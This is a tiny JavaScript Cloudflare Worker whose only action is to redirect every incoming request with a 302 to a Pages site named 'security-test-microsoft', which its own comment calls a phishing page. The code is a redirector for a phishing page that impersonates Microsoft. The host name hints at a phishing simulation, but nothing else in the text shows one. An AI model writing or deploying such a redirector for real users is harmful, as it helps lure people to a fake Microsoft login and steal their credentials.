export default {
  async fetch(request) {
    // Redirect to your Cloudflare Pages phishing page
    const targetUrl = 'https://security-test-microsoft.pages.dev';
    return Response.redirect(targetUrl, 302);
  },
};
